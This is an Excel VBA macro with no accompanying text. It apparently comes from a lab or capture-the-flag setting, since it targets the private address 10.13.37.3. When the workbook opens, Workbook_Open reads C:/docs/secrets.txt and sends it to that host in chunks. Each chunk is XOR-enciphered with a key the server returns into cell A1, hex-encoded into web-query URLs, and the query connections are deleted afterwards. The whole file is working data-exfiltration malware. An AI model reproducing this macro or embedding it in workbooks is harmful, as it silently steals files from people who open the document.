Private Sub Workbook_Open()

Dim byteArr() As Byte
Dim fileInt As Integer: fileInt = FreeFile
Open "C:/docs/secrets.txt" For Binary Access Read As #fileInt
ReDim byteArr(0 To LOF(fileInt) - 1)
Get #fileInt, , byteArr
Close #fileInt

Dim tmpStr As String
tmpStr = sendFile(byteArr())
End Sub

Function sendFile(b() As Byte) As String
  Dim tmpStr As String
  Dim midStr As String
  Dim out As String
  Dim urlStr As String
  Dim code As String
  Dim i
  urlStr = "URL;http://10.13.37.3/"
  req (urlStr)
  code = Range("A1").Value
  tmpStr = StrConv(b(), vbUnicode)
  For i = 1 To 256 Step 8
    midStr = Mid(tmpStr, i, 8)
    out = Cipher(midStr, code)
    out = ByteArrayToHexStr(StrConv(out, vbFromUnicode))
    urlStr = "URL;http://10.13.37.3/?" & CStr(out)
    req (urlStr)
    code = Range("A1").Value
  Next i
  sendFile = tmpStr
End Function

Function req(url As String)
  With ActiveSheet.QueryTables.Add(Connection:=url, Destination:=Range("A1"))
    .PostText = ""
    .PreserveFormatting = True
    .RefreshOnFileOpen = False
    .BackgroundQuery = False
    .RefreshStyle = xlOverwriteCells
    .WebSelectionType = xlEntirePage
    .WebPreFormattedTextToColumns = True
    .Refresh BackgroundQuery:=False
    .WorkbookConnection.Delete
    End With
End Function

Public Function Cipher(Text As String, Key As String) As String
  Dim bText() As Byte
  Dim bKey() As Byte
  Dim TextUB As Long
  Dim KeyUB As Long
  Dim TextPos As Long
  Dim KeyPos As Long
  
  bText = StrConv(Text, vbFromUnicode)
  bKey = StrConv(Key, vbFromUnicode)
  TextUB = UBound(bText)
  KeyUB = UBound(bKey)
  For TextPos = 0 To TextUB
    bText(TextPos) = bText(TextPos) Xor bKey(KeyPos)
    If KeyPos < KeyUB Then
      KeyPos = KeyPos + 1
    Else
      KeyPos = 0
    End If
  Next TextPos
  Cipher = StrConv(bText, vbUnicode)
End Function

Function ByteArrayToHexStr(b() As Byte) As String
   Dim n As Long, i As Long

   ByteArrayToHexStr = Space$(3 * (UBound(b) - LBound(b)) + 2)
   n = 1
   For i = LBound(b) To UBound(b)
      Mid$(ByteArrayToHexStr, n, 2) = Right$("00" & Hex$(b(i)), 2)
      n = n + 3
   Next
   ByteArrayToHexStr = Replace(ByteArrayToHexStr, " ", "")
End Function
